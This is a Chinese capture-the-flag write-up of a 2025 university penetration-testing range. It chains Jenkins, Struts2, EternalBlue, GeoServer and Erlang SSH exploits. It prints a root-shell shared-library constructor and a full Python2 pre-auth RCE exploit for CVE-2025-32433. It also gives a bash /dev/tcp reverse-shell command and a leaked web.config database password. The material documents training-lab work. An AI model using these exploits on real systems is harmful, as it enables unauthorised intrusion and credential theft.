# 第十届上海市大学生网络安全大赛 暨“磐石行动”2025第三届全国高校网络安全攻防大赛复赛wp-先知社区

> **来源**: https://xz.aliyun.com/news/18601  
> **文章ID**: 18601

---

# 一条龙“服务”渗透

<http://10.103.227.95:8000/users/>

访问这个，有报错，往下翻获得加密数据

![image.png](images/img_18601_000.png)

解密获得凭证

![image.png](images/img_18601_001.png)

hash爆一下获得admin:P@ssw0rd\_123

ssh登陆

![image.png](images/img_18601_002.png)

普通权限，通过利用admin的私钥连接root

![image.png](images/img_18601_003.png)

fscan扫内网

192.168.66.128发现有个Jenkins

在当前机器家目录下的代码中找到了Jenkins的账户凭据泄露

拿着凭据直接改authorization头 直接登录后台

![image.png](images/img_18601_004.png)

![image.png](images/img_18601_005.png)

![image.png](images/img_18601_006.png)

![image.png](images/img_18601_007.png)

利用脚本地址：<https://github.com/rabbitmask/Jenkins_Credentials_Crack/blob/master/jenkins_credential.py>

![image.png](images/img_18601_008.png)

ssh上去后sudo su提权

![image.png](images/img_18601_009.png)

接着扫内网

![image.png](images/img_18601_010.png)

![image.png](images/img_18601_011.png)

有任意重置密码的洞**CVE-2023-42820**

<https://cloud.tencent.com/developer/article/2357891>

跟着打一遍

![image.png](images/img_18601_012.png)

Web终端进入ssh界面，需要提权

![image.png](images/img_18601_013.png)

构造恶意动态链

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
 __attribute__((constructor))
void init() {

     setuid(0); setgid(0);

         system("/bin/sh");

  }
```

![image.png](images/img_18601_014.png)

# 清晨的第一缕阳光

![image.png](images/img_18601_015.png)

struts2一把梭

改administrator密码远程登陆拿flag

![image.png](images/img_18601_016.png)

扫内网，发现192.168.99.112有永恒之蓝可以打

![image.png](images/img_18601_017.png)

靶机环境问题，打了10多遍，只成功了一次

![image.png](images/img_18601_018.png)

![image.png](images/img_18601_019.png)

# 信息泄露引发的血案

​

![image.png](images/img_18601_020.png)

Readme 路径发现泄露代码

审计之后发现XFF伪造+base64 路径穿越../可以读取任意文件

![image.png](images/img_18601_021.png)

![image.png](images/img_18601_022.png)

读flag

![image.png](images/img_18601_023.png)

可以读web.config获取远程登陆的凭据

```
<?xml version="1.0" encoding="utf-8"?>
<!--
  有关如何配置 ASP.NET 应用程序的详细信息，请访问
  http://go.microsoft.com/fwlink/?LinkId=169433
  -->
<configuration>

  <connectionStrings>
    <add name="Conn" connectionString="Server=192.168.99.51;Database=ctfsec;Uid=root;Password=KyHbPqxA3tD8oj17yC;MultipleActiveResultSets=true" providerName="System.Data.SqlClient" />
  </connectionStrings>
  <appSettings>
    <!--配置数据库类型,用于适配兼容代码-->
    <!--<add key="DataBaseType" value="MsSql"/>-->

    <!--新框架临时变更为子应用程序所需要设置的前缀-->
    <add key="UI" value="/CN"/>
    <!--是否开启用户的列表列头过滤配置-->
    <add key="IsUserGridConfig" value="true"/>
    <!--是否开启角色的列表列头过滤配置-->
    <add key="IsRoleGridConfig" value="true"/>
    <!--TY.Data.Log 记录日志到Logs文件夹下-->
    <add key="IsWriteLog" value="true"/>
    <add key="OpenDebugInfo" value="true"/>
    <add key="LogConn" value="Conn"/>
    <add key="Aop" value="TY.Logic.Sys.Aop,TY.Logic"/>
    <!--配置数据库链接的名称，即你Web.config中链接数据库connectionStrings的name名称，默认为Conn-->
    <add key="DatabaseConnectionName" value="Conn"/>

    <add key="ReplaceSqlInjection" value=""/>

    <!--皮肤样式 blue/orange,默认orange-->
    <add key="WorkflowTheme" value="orange"/>

    <!--接入系统当前登录者信息上下文所在类，Value格式：类全名，程序集名-->
    <add key="CurrentLoginUser" value="TY.Core.CurrentUserInfo,TY.Core"/>
    <!--接入系统当前登录者信息上下文所在类对应的6个属性名  （UserId:MyUserId 其中UserId为工作流的参数名，MyUserId是接入系统当前登录者类中的属性名）-->
    <add key="CurrentLoginUserPropertyName"
       value="UserId:MyUserId,UserName:MyUserName,RealName:MyRealName,OrgId:MyOrgId,OrgName:MyOrgName,OrgFullName:MyOrgFullName,Mobile:CellPhone"/>
    <!--**********工作流引擎接入 配置结束**********-->


  </appSettings>
  <system.web>
    <httpRuntime requestValidationMode="2.0" requestPathInvalidCharacters="" maxRequestLength="1024000000" executionTimeout="30000000"/>
    <compilation debug="true" targetFramework="4.0">
    </compilation>
    <pages controlRenderingCompatibilityVersion="4.0">
      <namespaces>
      </namespaces>
    </pages>
    <customErrors mode="Off"></customErrors>
    <authorization>
      <deny users="1|2
```

root：KyHbPqxA3tD8oj17yC

抽象凭据，root登windows

登上去发现有df，不会免杀，寄：）

# 夜色最浓时

![image.png](images/img_18601_024.png)

8080起的geoserver

用<https://github.com/bmth666/GeoServer-Tools-CVE-2024-36401>

直接打

![image.png](images/img_18601_025.png)

打个内存马进去，用冰蝎连一下

![image.png](images/img_18601_026.png)

甜土豆一把梭

![image.png](images/img_18601_027.png)

上反连马搭隧道&fscan扫内网

![image.png](images/img_18601_028.png)

192.168.188.223有postgresql数据库直接连

![image.png](images/img_18601_029.png)

连上后直接sudo读flag，改一下root密码后连ssh

![image.png](images/img_18601_030.png)

![image.png](images/img_18601_031.png)

fscan继续扫

获得10.177.166.188:2222 => [ssh] 信息:protocol 2.0 Banner:[SSH-2.0-Erlang/5.2.8.]

找到CVE-2025-32433

但靶机没有python3环境只有pythpn2读，用ai改一下利用

```
#!/usr/bin/env python2  
# -*- coding: utf-8 -*-  
  
import socket  
import struct  
import time  
import argparse  
import base64  
import sys  
  
# === Helper to format SSH string (4-byte length + bytes) ===  
def string_payload(s):  
    s_bytes = s.encode("utf-8")  
    return struct.pack(">I", len(s_bytes)) + s_bytes  
  
# === Builds SSH_MSG_CHANNEL_OPEN for session ===  
def build_channel_open(channel_id=0):  
    return (  
        '\x5a'  # SSH_MSG_CHANNEL_OPEN  
        + string_payload("session")  
        + struct.pack(">I", channel_id)  
        + struct.pack(">I", 0x68000)  
        + struct.pack(">I", 0x10000)  
    )  
  
# === Builds SSH_MSG_CHANNEL_REQUEST with 'exec' payload ===  
def build_channel_request(channel_id=0, command=None):  
    return (  
        '\x62'  
        + struct.pack(">I", channel_id)  
        + string_payload("exec")  
        + '\x01'  # want_reply = true  
        + string_payload(command)  
    )  
  
# === Builds a minimal but valid SSH_MSG_KEXINIT packet ===  
def build_kexinit():  
    cookie = '\x00' * 16  
  
    def name_list(l):  
        return string_payload(",".join(l))  
  
    return (  
        '\x14'  
        + cookie  
        + name_list([  
            "curve25519-sha256",  
            "ecdh-sha2-nistp256",  
            "diffie-hellman-group-exchange-sha256",  
            "diffie-hellman-group14-sha256",  
        ])  
        + name_list(["rsa-sha2-256", "rsa-sha2-512"])  
        + name_list(["aes128-ctr"]) * 2  
        + name_list(["hmac-sha1"]) * 2  
        + name_list(["none"]) * 2  
        + name_list([]) * 2  
        + '\x00'  
        + struct.pack(">I", 0)  
    )  
  
# === Pads a packet to match SSH framing ===  
def pad_packet(payload, block_size=8):  
    min_padding = 4  
    padding_len = block_size - ((len(payload) + 5) % block_size)  
    if padding_len < min_padding:  
        padding_len += block_size  
    return (  
        struct.pack(">I", len(payload) + 1 + padding_len)  
        + chr(padding_len)  
        + payload  
        + '\x00' * padding_len  
    )  
  
# === Convert system command to Erlang os:cmd format ===  
def format_erlang_command(cmd):  
    encoded_cmd = base64.b64encode(cmd.encode('utf-8'))  
    return 'os:cmd(binary_to_list(base64:decode("{}"))).'.format(encoded_cmd)  
  
# === Main exploit flow ===  
def main():  
    parser = argparse.ArgumentParser(description='Exploit for Erlang CVE-2025-32433')  
    parser.add_argument('-t', '--target', default="127.0.0.1", help='Target IP address (default: 127.0.0.1)')  
    parser.add_argument('-p', '--port', type=int, default=2222, help='Target port (default: 2222)')  
    parser.add_argument('-c', '--command', help='System command to execute (e.g., touch /tmp/success)')  
    parser.add_argument('-e', '--erlang', help='Raw Erlang code (e.g., os:cmd("touch /tmp/success").)')  
    args = parser.parse_args()  
  
    if args.erlang:  
        erlang_cmd = args.erlang  
    elif args.command:  
        erlang_cmd = format_erlang_command(args.command)  
    else:  
        parser.print_help()  
        return  
  
    try:  
        s = socket.create_connection((args.target, args.port), timeout=5)  
        print "[*] Connecting to SSH server..."  
  
        # 1. Send client banner  
        s.sendall("SSH-2.0-OpenSSH_8.9\r
")  
        banner = s.recv(1024)  
        print "[+] Received banner: {}".format(banner.strip())  
  
        time.sleep(0.5)  
  
        # 2. Send KEXINIT  
        print "[*] Sending SSH_MSG_KEXINIT..."  
        s.sendall(pad_packet(build_kexinit()))  
        time.sleep(0.5)  
  
        # 3. Send CHANNEL_OPEN  
        print "[*] Sending SSH_MSG_CHANNEL_OPEN..."  
        s.sendall(pad_packet(build_channel_open()))  
        time.sleep(0.5)  
  
        # 4. Send CHANNEL_REQUEST  
        print "[*] Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)..."  
        print "[*] Erlang payload: {}".format(erlang_cmd)  
        s.sendall(pad_packet(build_channel_request(command=erlang_cmd)))  
  
        print "[✓] Exploit sent! Command executed on target"  
  
        try:  
            response = s.recv(1024)  
            print "[+] Received response: {}".format(response.encode('hex'))  
        except socket.timeout:  
            print "[*] No response within timeout period (expected)"  
  
        s.close()  
  
    except Exception as e:  
        print "[!] Error: {}".format(e)  
        sys.exit(1)  
  
if __name__ == "__main__":  
    main()
```

​

这里原本是用ssh做的链式代理，然后在被控靶机上编译了一个nc去弹shell，后面发现靶机出网，那就简单多了，直接弹公网上

python2 python2.exp.py -t 10.177.166.188 -p 2222 -c "bash -i >& /dev/tcp/IP/port 0>&1"

![image.png](images/img_18601_032.png)

内网还有一台域控，在前面的数据库找到一推凭证，喷洒一下获得一个用户凭据

![image.png](images/img_18601_033.png)

打不通思密达，可能路走偏了，域内500+用户，可能遗漏了一些信息

![image.png](images/img_18601_034.png)

​

​

​

​

​

​

​

​
